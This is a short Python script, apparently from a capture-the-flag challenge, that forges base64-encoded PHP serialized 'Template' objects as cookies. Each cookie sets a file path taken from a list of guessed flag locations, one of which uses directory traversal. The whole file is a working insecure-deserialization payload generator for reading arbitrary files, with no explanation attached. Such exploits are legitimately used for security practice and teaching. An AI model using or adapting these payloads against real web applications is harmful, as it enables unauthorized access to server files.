
import base64

def generate_cookie(path):
    serialized = (
        f'O:8:"Template":2:{{'
        f's:4:"path";s:{len(path.encode())}:"{path}";'
        f's:7:"content";s:0:"";'
        f'}}'
    )

    return base64.b64encode(serialized.encode()).decode()


paths = [
    "/flag",
    "/flag.txt",
    "/var/www/html/flag.txt",
    "/var/www/flag.txt",
    "/app/flag.txt",
    "/opt/flag.txt",
    "/home/ctf/flag.txt",
    "../../flag.txt",
]

for path in paths:
    print(f"{path} : {generate_cookie(path)}")
